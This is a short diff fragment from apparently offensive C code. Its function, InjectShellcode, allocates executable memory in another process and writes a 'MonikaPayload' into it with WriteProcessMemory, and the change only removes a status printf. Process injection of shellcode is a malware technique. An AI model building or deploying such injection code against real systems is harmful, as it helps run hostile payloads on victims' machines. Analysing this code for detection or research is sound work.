@@ -100,7 +100,6 @@ LPVOID InjectShellcode(HANDLE hProcess, UINT8 *buf, UINT64 bufsize)
     printf("Allocated RWX memory at address: 0x%p\n", remotePayloadMemory);
     // Write the MonikaPayload to the allocated memory
     WriteProcessMemory(hProcess, remotePayloadMemory, buf, bufsize, NULL);
-    printf("Shellcode written to remote memory successfully\n");
     return remotePayloadMemory;
 }
 }
